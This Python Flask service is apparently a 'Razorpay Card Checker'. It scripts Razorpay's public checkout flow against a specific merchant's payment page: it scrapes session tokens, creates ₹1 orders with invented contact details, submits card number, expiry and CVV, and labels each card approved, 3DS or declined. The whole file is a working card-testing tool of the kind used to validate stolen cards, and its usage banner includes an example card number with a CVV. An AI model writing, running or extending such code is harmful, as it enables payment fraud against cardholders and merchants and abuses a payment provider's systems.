from flask import Flask, request, jsonify
import requests
import random
import time
import re
import json
from datetime import datetime
import hashlib
import base64
import logging
import os
import urllib.parse

app = Flask(__name__)

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Configuration
RAZORPAY_PAGE_URL = 'https://razorpay.me/@krishnarajkumargupta'
PAYMENT_PAGE_ID = 'pl_RDvLyLFnF1rg6w'
PAYMENT_PAGE_ITEM_ID = 'ppi_RDvLyN8DIJlev3'
AMOUNT = 100  # ₹1.00 INR

class RazorpayChecker:
    def __init__(self):
        self.session = requests.Session()
        self.key_id = None
        self.order_id = None
        self.payment_id = None
        self.session_token = None
        self.keyless_header = None
        self.device_id = None
        self.unified_session_id = None
        self.raw_responses = {}
        self.response_details = []

    def log_response(self, step, response, extra_info=None):
        """Log full response details"""
        try:
            response_text = response.text if response.text else 'No response body'
            response_headers = dict(response.headers)
            
            # Try to parse JSON
            response_json = None
            try:
                response_json = response.json()
            except:
                pass
            
            response_data = {
                'step': step,
                'timestamp': datetime.now().isoformat(),
                'status_code': response.status_code,
                'url': response.url,
                'request_headers': dict(response.request.headers) if hasattr(response, 'request') else {},
                'response_headers': response_headers,
                'response_size': len(response_text),
                'response_time': response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0,
                'raw_response': response_text[:10000],  # Limit to 10K chars
                'parsed_response': response_json,
                'extra_info': extra_info
            }
            
            self.response_details.append(response_data)
            self.raw_responses[step] = response_data
            
            logger.debug(f"[{step}] Status: {response.status_code}, Time: {response_data['response_time']:.2f}s")
            
            return response_data
        except Exception as e:
            logger.error(f"Error logging response: {str(e)}")
            return None

    def generate_device_id(self):
        """Generate device ID"""
        timestamp = str(int(time.time() * 1000))
        random_part = str(random.randint(10000000, 99999999))
        hash_part = hashlib.md5(f"{timestamp}{random.random()}".encode()).hexdigest()
        return f"1.{hash_part}.{timestamp}.{random_part}"

    def generate_unified_session(self):
        """Generate unified session ID"""
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        return ''.join(random.choice(chars) for _ in range(14))

    def load_payment_page(self):
        """Request #1: Load payment page"""
        try:
            logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            logger.info("Starting Razorpay Checker Session...")
            logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            logger.info("[Step 1/5] Loading payment page...")

            response = self.session.get(
                RAZORPAY_PAGE_URL,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Upgrade-Insecure-Requests': '1'
                },
                timeout=15
            )

            self.log_response('step1_load_page', response)

            if response.status_code == 200:
                # Multiple regex patterns for key_id extraction
                patterns = [
                    r'"key_id"\s*:\s*"([^"]+)"',
                    r'key_id\s*=\s*"([^"]+)"',
                    r'data-key-id="([^"]+)"',
                    r'key_id["\']?\s*[:=]\s*["\']([^"\']+)["\']'
                ]
                
                for pattern in patterns:
                    key_match = re.search(pattern, response.text)
                    if key_match:
                        self.key_id = key_match.group(1)
                        logger.info(f"           ✓ key_id: {self.key_id}")
                        return True
                
                logger.error(f"           Failed to extract key_id. Page title: {self.extract_title(response.text)}")
                return False
            
            logger.error(f"           Failed with status {response.status_code}")
            return False

        except requests.RequestException as e:
            logger.error(f"           Request error: {str(e)}")
            return False
        except Exception as e:
            logger.error(f"           Unexpected error: {str(e)}")
            return False

    def extract_title(self, html):
        """Extract page title from HTML"""
        match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1) if match else "No title found"

    def create_order(self, email, phone):
        """Request #2: Create order"""
        try:
            logger.info("[Step 2/5] Creating payment order...")

            payload = {
                'line_items': [{'payment_page_item_id': PAYMENT_PAGE_ITEM_ID, 'amount': AMOUNT}],
                'notes': {'email': email, 'phone': phone, 'purpose': 'Advance payment'}
            }

            response = self.session.post(
                f'https://api.razorpay.com/v1/payment_pages/{PAYMENT_PAGE_ID}/order',
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                json=payload,
                timeout=15
            )

            response_data = self.log_response('step2_create_order', response, {'payload': payload})

            if response.status_code == 200:
                data = response.json() if response.text else {}
                self.order_id = data.get('order', {}).get('id')
                if self.order_id:
                    logger.info(f"           ✓ order_id: {self.order_id}")
                    return True
                
                logger.error(f"           No order_id found in response")
                return False
            
            logger.error(f"           Failed with status {response.status_code}")
            return False

        except Exception as e:
            logger.error(f"           Error: {str(e)}")
            return False

    def load_checkout_and_extract_token(self):
        """Request #3: Load checkout page and extract session_token"""
        try:
            logger.info("[Step 3/5] Loading checkout & extracting token...")

            # Generate IDs
            self.device_id = self.generate_device_id()
            self.unified_session_id = self.generate_unified_session()
            self.keyless_header = 'api_v1:KzXmzqcw1by1S44tb/N9WQhWtUHwmy9yqkl9Izr3C8P2s1A1bpGkvmj5TLmZPZYlEdB9Hm+TQyEMj5G+yfOB6B9yqhItUQ=='

            params = {
                'traffic_env': 'production',
                'build': '9cb57fdf457e44eac4384e182f925070ff5488d9',
                'build_v1': '715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2',
                'checkout_v2': '1',
                'new_session': '1',
                'keyless_header': self.keyless_header,
                'rzp_device_id': self.device_id,
                'unified_session_id': self.unified_session_id
            }

            response = self.session.get(
                'https://api.razorpay.com/v1/checkout/public',
                headers={
                    'Accept': 'text/html',
                    'Referer': 'https://pages.razorpay.com/',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive'
                },
                params=params,
                timeout=15
            )

            self.log_response('step3_checkout_page', response, {'params': params})

            if response.status_code == 200:
                # Multiple patterns for session token extraction
                patterns = [
                    r'window\.session_token\s*=\s*"([^"]+)"',
                    r'session_token\s*:\s*"([^"]+)"',
                    r'"session_token"\s*:\s*"([^"]+)"',
                    r'data-session-token="([^"]+)"'
                ]
                
                for pattern in patterns:
                    token_match = re.search(pattern, response.text)
                    if token_match:
                        self.session_token = token_match.group(1)
                        logger.info(f"           ✓ session_token: {self.session_token[:40]}...")
                        return True
                
                logger.error(f"           Failed to extract session_token")
                return False
            
            logger.error(f"           Failed with status {response.status_code}")
            return False

        except Exception as e:
            logger.error(f"           Error: {str(e)}")
            return False

    def submit_payment(self, card_number, exp_month, exp_year, cvv, email, phone):
        """Request #4: Submit payment"""
        try:
            logger.info("[Step 4/5] Submitting payment...")

            if not self.session_token:
                raise Exception("Missing session_token")

            # Checkout ID
            checkout_id = f"RRh{hashlib.md5(str(time.time()).encode()).hexdigest()[:10]}"

            # Device fingerprint
            fingerprint_payload = base64.b64encode(f"fp_{time.time()}_{random.random()}".encode()).decode()

            # Prepare form data
            form_data = {
                'notes[email]': email,
                'notes[phone]': phone,
                'notes[purpose]': 'Advance payment',
                'payment_link_id': PAYMENT_PAGE_ID,
                'key_id': self.key_id,
                'contact': f'+91{phone}',
                'email': email,
                'currency': 'INR',
                '_[integration]': 'payment_pages',
                '_[checkout_id]': checkout_id,
                '_[device.id]': self.device_id,
                '_[library]': 'checkoutjs',
                '_[platform]': 'browser',
                '_[referer]': RAZORPAY_PAGE_URL,
                'amount': str(AMOUNT),
                'order_id': self.order_id,
                'device_fingerprint[fingerprint_payload]': fingerprint_payload,
                'method': 'card',
                'card[number]': card_number.replace(' ', ''),
                'card[cvv]': cvv,
                'card[name]': 'Test User',
                'card[expiry_month]': exp_month.zfill(2),
                'card[expiry_year]': exp_year,
                'save': '0',
                'dcc_currency': 'INR'
            }

            # Log masked card info for debugging
            masked_card = f"{card_number[:6]}******{card_number[-4:]}"
            logger.debug(f"           Card: {masked_card}, Exp: {exp_month}/{exp_year}")

            params = {
                'key_id': self.key_id,
                'session_token': self.session_token,
                'keyless_header': self.keyless_header
            }

            headers = {
                'Content-type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0',
                'x-session-token': self.session_token,
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.5',
                'Origin': 'https://api.razorpay.com',
                'Referer': f'https://api.razorpay.com/v1/checkout/public?{urllib.parse.urlencode(params)}'
            }

            response = self.session.post(
                'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
                params=params,
                headers=headers,
                data=form_data,
                timeout=30
            )

            # Create masked form data for logging
            masked_form_data = form_data.copy()
            masked_form_data['card[number]'] = masked_card
            masked_form_data['card[cvv]'] = '***'
            masked_form_data['email'] = email[:3] + '***' + email[email.find('@'):]
            masked_form_data['contact'] = '+91***' + phone[-3:]

            self.log_response('step4_submit_payment', response, {
                'params': params,
                'form_data': masked_form_data,
                'headers': headers
            })

            logger.info(f"           Response: HTTP {response.status_code}")

            if response.status_code == 200:
                return response.json() if response.text else {}
            else:
                return {'raw_response': response.text} if response.text else {}

        except Exception as e:
            logger.error(f"           Error: {str(e)}")
            return {'error': str(e)}

    def check_payment_status(self):
        """Request #5: Check payment status"""
        try:
            if not self.payment_id:
                logger.info("           No payment_id to check")
                return None

            logger.info(f"[Step 5/5] Checking payment status: {self.payment_id}")

            # Try multiple endpoints for status check
            endpoints = [
                f'https://api.razorpay.com/v1/payments/{self.payment_id}',
                f'https://api.razorpay.com/v1/standard_checkout/payments/{self.payment_id}'
            ]

            for endpoint in endpoints:
                try:
                    response = self.session.get(
                        endpoint,
                        headers={
                            'User-Agent': 'Mozilla/5.0',
                            'Accept': 'application/json',
                            'Accept-Language': 'en-US,en;q=0.5'
                        },
                        timeout=15
                    )

                    self.log_response(f'step5_status_{endpoint.split("/")[-2]}', response)
                    
                    if response.status_code == 200:
                        return response.json() if response.text else {}
                        
                except Exception as e:
                    logger.debug(f"           Failed to check {endpoint}: {str(e)}")
                    continue

            return None

        except Exception as e:
            logger.error(f"           Error: {str(e)}")
            return {'error': str(e)}

    def capture_3ds_response(self, payment_response):
        """Capture 3DS authentication response if available"""
        try:
            if payment_response.get('type') == 'redirect' and payment_response.get('redirect'):
                auth_url = payment_response.get('request', {}).get('url', '')
                if auth_url and 'authenticate' in auth_url:
                    logger.info(f"[3DS Capture] Attempting to capture 3DS response from: {auth_url}")
                    
                    # Try to simulate 3DS response (this won't complete but will capture response)
                    try:
                        response = self.session.post(
                            auth_url,
                            headers={
                                'User-Agent': 'Mozilla/5.0',
                                'Accept': 'application/json',
                                'Content-Type': 'application/json'
                            },
                            json={'action': 'simulate'},  # Dummy payload
                            timeout=10,
                            allow_redirects=False
                        )
                        
                        self.log_response('3ds_attempt', response)
                        return response.json() if response.text else {}
                    except:
                        pass
            
            return None
        except Exception as e:
            logger.debug(f"3DS capture error: {str(e)}")
            return None

def analyze_raw_responses(response_details):
    """Analyze all raw responses to determine card status"""
    analysis = {
        'overall_status': 'unknown',
        'gateway_interaction': [],
        'key_findings': [],
        'recommendation': '',
        'timeline': []
    }
    
    for resp in response_details:
        step = resp.get('step', 'unknown')
        status_code = resp.get('status_code')
        response_time = resp.get('response_time', 0)
        
        analysis['timeline'].append({
            'step': step,
            'status': status_code,
            'time': f"{response_time:.2f}s",
            'timestamp': resp.get('timestamp', '')
        })
        
        # Analyze step1: Payment page load
        if 'step1' in step:
            if status_code == 200:
                analysis['gateway_interaction'].append('Payment page loaded successfully')
                if resp.get('parsed_response') or 'key_id' in str(resp.get('raw_response', '')):
                    analysis['key_findings'].append('✓ Razorpay integration active')
            else:
                analysis['key_findings'].append('✗ Failed to load payment page')
                
        # Analyze step2: Order creation
        elif 'step2' in step:
            if status_code == 200:
                analysis['gateway_interaction'].append('Order created successfully')
                order_data = resp.get('parsed_response', {})
                if order_data.get('order', {}).get('id'):
                    analysis['key_findings'].append('✓ Order ID generated')
            else:
                analysis['key_findings'].append('✗ Order creation failed')
                
        # Analyze step3: Checkout page
        elif 'step3' in step:
            if status_code == 200:
                analysis['gateway_interaction'].append('Checkout session established')
                if 'session_token' in str(resp.get('raw_response', '')):
                    analysis['key_findings'].append('✓ Session token acquired')
                    
        # Analyze step4: Payment submission
        elif 'step4' in step:
            parsed = resp.get('parsed_response', {})
            raw_text = resp.get('raw_response', '')
            
            if status_code == 200:
                analysis['gateway_interaction'].append('Payment submitted to gateway')
                
                # Check for redirect (3DS)
                if parsed.get('type') == 'redirect' and parsed.get('redirect'):
                    analysis['overall_status'] = '3ds_required'
                    analysis['key_findings'].append('✓ Card requires 3D Secure authentication')
                    analysis['recommendation'] = 'Card is active and enrolled in 3D Secure'
                    
                # Check for payment ID
                elif parsed.get('payment_id') or parsed.get('razorpay_payment_id'):
                    analysis['overall_status'] = 'approved'
                    analysis['key_findings'].append('✓ Payment processed successfully')
                    analysis['recommendation'] = 'Card accepted without 3D Secure'
                    
                # Check for errors
                elif 'error' in parsed:
                    error_data = parsed['error']
                    if isinstance(error_data, dict):
                        error_code = error_data.get('code', '')
                        error_desc = error_data.get('description', '')
                        
                        if 'insufficient' in error_desc.lower():
                            analysis['overall_status'] = 'declined_insufficient_funds'
                            analysis['key_findings'].append('✗ Insufficient funds')
                        elif 'expired' in error_desc.lower():
                            analysis['overall_status'] = 'declined_expired'
                            analysis['key_findings'].append('✗ Card expired')
                        elif 'invalid' in error_desc.lower():
                            analysis['overall_status'] = 'declined_invalid'
                            analysis['key_findings'].append('✗ Invalid card details')
                        else:
                            analysis['overall_status'] = 'declined'
                            analysis['key_findings'].append(f'✗ {error_desc}')
                    else:
                        analysis['overall_status'] = 'declined'
                        analysis['key_findings'].append('✗ Payment failed')
                        
            else:
                analysis['overall_status'] = 'gateway_error'
                analysis['key_findings'].append(f'✗ Gateway returned HTTP {status_code}')
                
        # Analyze step5: Status check
        elif 'step5' in step:
            if status_code == 200:
                parsed = resp.get('parsed_response', {})
                status = parsed.get('status', '').lower()
                
                if status in ['captured', 'authorized']:
                    analysis['overall_status'] = 'approved'
                    analysis['key_findings'].append(f'✓ Payment {status}')
                elif status == 'failed':
                    analysis['overall_status'] = 'declined'
                    analysis['key_findings'].append('✗ Payment failed')
                elif status == 'pending':
                    if analysis['overall_status'] == 'unknown':
                        analysis['overall_status'] = 'pending'
                        analysis['key_findings'].append('⏳ Payment pending')
    
    # Final status mapping
    status_map = {
        'approved': 'approved',
        '3ds_required': '3ds',
        'declined_insufficient_funds': 'declined',
        'declined_expired': 'declined',
        'declined_invalid': 'declined',
        'declined': 'declined',
        'gateway_error': 'declined',
        'pending': '3ds',
        'unknown': 'declined'
    }
    
    final_status = status_map.get(analysis['overall_status'], 'declined')
    
    return {
        'status': final_status,
        'analysis': analysis
    }

def format_final_result(status_analysis, raw_responses, payment_response, status_response, card_info):
    """Format final result with all details"""
    
    # Get analysis results
    analysis = status_analysis.get('analysis', {})
    final_status = status_analysis.get('status', 'declined')
    
    # Determine description based on analysis
    if final_status == 'approved':
        description = 'Payment successful - Card accepted'
    elif final_status == '3ds':
        description = '3D Secure authentication required'
    else:
        # Get the first key finding that indicates decline
        decline_reasons = [f for f in analysis.get('key_findings', []) if f.startswith('✗')]
        if decline_reasons:
            description = decline_reasons[0].replace('✗ ', '')
        else:
            description = 'Payment declined'
    
    # Prepare response data
    result = {
        'Status': final_status,
        'description': description,
        'card_info': card_info,
        'timestamp': datetime.now().isoformat(),
        'request_id': hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:12],
        'summary': {
            'overall_status': analysis.get('overall_status', 'unknown'),
            'gateway_interactions': analysis.get('gateway_interaction', []),
            'key_findings': analysis.get('key_findings', []),
            'recommendation': analysis.get('recommendation', ''),
            'processing_timeline': analysis.get('timeline', [])
        },
        'gateway_responses': {
            'payment_submission': payment_response,
            'status_check': status_response
        },
        'raw_responses_summary': {}
    }
    
    # Add raw response summaries (not full to avoid huge response)
    for step, resp_data in raw_responses.items():
        if isinstance(resp_data, dict):
            result['raw_responses_summary'][step] = {
                'status_code': resp_data.get('status_code'),
                'response_time': resp_data.get('response_time'),
                'response_size': resp_data.get('response_size'),
                'url': resp_data.get('url'),
                'key_data': extract_key_data(resp_data)
            }
    
    # Add full raw responses if requested via query parameter
    if request.args.get('debug') == 'full':
        result['full_raw_responses'] = raw_responses
    
    return result

def extract_key_data(response_data):
    """Extract key data from response for summary"""
    try:
        parsed = response_data.get('parsed_response')
        raw = response_data.get('raw_response', '')
        
        if parsed:
            if isinstance(parsed, dict):
                # Extract important fields
                keys = ['payment_id', 'order_id', 'status', 'error', 'type', 'redirect']
                result = {}
                for key in keys:
                    if key in parsed:
                        result[key] = parsed[key]
                    elif key in str(parsed):
                        # Try to find nested
                        for k, v in parsed.items():
                            if isinstance(v, dict) and key in v:
                                result[key] = v[key]
                return result if result else {'has_data': True}
        
        # Check raw text for common patterns
        if 'payment_id' in raw:
            return {'contains_payment_id': True}
        elif 'error' in raw.lower():
            return {'contains_error': True}
        elif 'success' in raw.lower():
            return {'contains_success': True}
        
        return {'response_type': 'text/raw'}
    except:
        return {'extraction_failed': True}

@app.route('/api/razorpay/pay', methods=['GET'])
def check_card():
    cc_data = request.args.get('cc')
    debug_mode = request.args.get('debug', '').lower()
    
    if not cc_data:
        return jsonify({
            'Status': 'declined',
            'description': 'Missing card data',
            'error': 'No cc parameter provided'
        }), 400

    parts = cc_data.split('|')
    if len(parts) != 4:
        return jsonify({
            'Status': 'declined',
            'description': 'Invalid card format',
            'error': f'Expected format: number|mm|yy|cvv, got {len(parts)} parts'
        }), 400

    card_number, exp_month, exp_year, cvv = parts
    
    # Generate test data
    email = f"test{random.randint(1000,9999)}@example.com"
    phone = f"74287{random.randint(10000,99999)}"
    
    # Card info
    card_info = {
        'bin': card_number[:6],
        'first_6': card_number[:6],
        'last_4': card_number[-4:],
        'expiry': f"{exp_month}/{exp_year}",
        'issuer': detect_issuer(card_number),
        'card_length': len(card_number),
        'luhn_valid': check_luhn(card_number)
    }

    logger.info(f"\n{'='*70}")
    logger.info(f"CARD CHECK STARTED: {card_number[:6]}******{card_number[-4:]}")
    logger.info(f"BIN: {card_info['bin']} | Issuer: {card_info['issuer']}")
    logger.info(f"Expiry: {exp_month}/{exp_year} | Luhn: {card_info['luhn_valid']}")
    logger.info(f"{'='*70}")

    try:
        checker = RazorpayChecker()

        # Step 1: Load payment page
        if not checker.load_payment_page():
            return jsonify({
                'Status': 'declined',
                'description': 'Failed to load payment page',
                'card_info': card_info,
                'error_details': checker.raw_responses
            }), 500

        # Step 2: Create order
        if not checker.create_order(email, phone):
            return jsonify({
                'Status': 'declined',
                'description': 'Failed to create order',
                'card_info': card_info,
                'error_details': checker.raw_responses
            }), 500

        # Step 3: Load checkout and extract token
        if not checker.load_checkout_and_extract_token():
            return jsonify({
                'Status': 'declined',
                'description': 'Failed to get session token',
                'card_info': card_info,
                'error_details': checker.raw_responses
            }), 500

        # Step 4: Submit payment
        payment_response = checker.submit_payment(card_number, exp_month, exp_year, cvv, email, phone)
        
        # Extract payment ID if available
        if isinstance(payment_response, dict):
            checker.payment_id = payment_response.get('payment_id') or payment_response.get('razorpay_payment_id')
        
        # Step 5: Check payment status
        status_response = checker.check_payment_status()
        
        # Optional: Try to capture 3DS response
        if isinstance(payment_response, dict) and payment_response.get('type') == 'redirect':
            _ = checker.capture_3ds_response(payment_response)
        
        # Analyze all responses
        status_analysis = analyze_raw_responses(checker.response_details)
        
        # Format final result
        result = format_final_result(
            status_analysis, 
            checker.raw_responses, 
            payment_response, 
            status_response, 
            card_info
        )
        
        # Log final result
        logger.info(f"\n{'━'*70}")
        logger.info(f"FINAL STATUS: {result['Status']}")
        logger.info(f"DESCRIPTION: {result['description']}")
        logger.info(f"ANALYSIS: {status_analysis.get('analysis', {}).get('overall_status', 'unknown')}")
        logger.info(f"{'━'*70}\n")
        
        return jsonify(result), 200

    except Exception as e:
        logger.error(f"Unexpected error in check_card: {str(e)}", exc_info=True)
        return jsonify({
            'Status': 'declined',
            'description': f'Internal server error: {str(e)}',
            'card_info': card_info,
            'error_type': type(e).__name__,
            'timestamp': datetime.now().isoformat()
        }), 500

def detect_issuer(card_number):
    """Detect card issuer from BIN"""
    if not card_number:
        return 'Unknown'
    
    first_two = card_number[:2]
    first_four = card_number[:4]
    first_six = card_number[:6]
    
    # Visa
    if card_number.startswith('4'):
        return 'Visa'
    
    # Mastercard
    if card_number.startswith('5') or card_number.startswith('2'):
        return 'Mastercard'
    
    # American Express
    if card_number.startswith('3'):
        if first_two in ['34', '37']:
            return 'American Express'
    
    # Discover
    if card_number.startswith('6'):
        if first_two == '65' or first_four == '6011' or first_six in ['622126', '622925']:
            return 'Discover'
    
    # Diners Club
    if first_two in ['36', '38', '39']:
        return 'Diners Club'
    
    # JCB
    if card_number.startswith('35'):
        return 'JCB'
    
    # RuPay
    if card_number.startswith('60') or card_number.startswith('65'):
        if first_four in ['6079', '6081']:
            return 'RuPay'
    
    return 'Unknown'

def check_luhn(card_number):
    """Validate card number using Luhn algorithm"""
    try:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d*2))
        return checksum % 10 == 0
    except:
        return False

@app.route('/api/razorpay/raw-test', methods=['GET'])
def raw_test():
    """Endpoint to test with full raw response capture"""
    test_card = "4111111111111111|12|27|123"  # Visa test card
    url = f"{request.host_url.rstrip('/')}/api/razorpay/pay?cc={test_card}&debug=full"
    return jsonify({
        'Status': 'approved',
        'description': 'Raw test endpoint',
        'test_url': url,
        'note': 'Add &debug=full to any request to get full raw responses'
    }), 200

@app.route('/api/razorpay/analyze-response', methods=['POST'])
def analyze_response():
    """Endpoint to analyze raw response data"""
    try:
        data = request.json
        if not data or 'raw_responses' not in data:
            return jsonify({'error': 'No raw_responses provided'}), 400
        
        analysis = analyze_raw_responses(data.get('raw_responses', []))
        
        return jsonify({
            'analysis': analysis,
            'timestamp': datetime.now().isoformat()
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        'Status': 'approved',
        'description': 'Service is healthy',
        'version': '3.0',
        'timestamp': datetime.now().isoformat(),
        'features': ['raw_response_capture', '3ds_detection', 'bin_analysis']
    }), 200

@app.route('/', methods=['GET'])
def root():
    return jsonify({
        'Status': 'approved',
        'description': 'Razorpay Card Checker API v3.0',
        'endpoints': {
            'check_card': '/api/razorpay/pay?cc=NUMBER|MM|YY|CVV',
            'debug_mode': '/api/razorpay/pay?cc=NUMBER|MM|YY|CVV&debug=full',
            'raw_test': '/api/razorpay/raw-test',
            'analyze': '/api/razorpay/analyze-response (POST)',
            'health': '/health'
        },
        'features': [
            'Complete raw response capture',
            '3D Secure detection',
            'Card issuer identification',
            'Luhn validation',
            'Response analysis',
            'Debug mode with full responses'
        ]
    }), 200

if __name__ == '__main__':
    print("\n" + "="*80)
    print("║" + " "*22 + "RAZORPAY CARD CHECKER v3.0" + " "*25 + "║")
    print("="*80)
    print("\nFEATURES:")
    print("  • Complete raw HTTP response capture")
    print("  • 3D Secure detection with authentication URL")
    print("  • Card BIN analysis and issuer detection")
    print("  • Response timeline and performance metrics")
    print("  • Debug mode: Add &debug=full to any request")
    print("\nENDPOINTS:")
    print("  GET  /api/razorpay/pay?cc=4202310285833720|03|27|375")
    print("  GET  /api/razorpay/pay?cc=4202310285833720|03|27|375&debug=full")
    print("  POST /api/razorpay/analyze-response")
    print("\nStarting server on 0.0.0.0:10000...")
    print("="*80 + "\n")
    
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)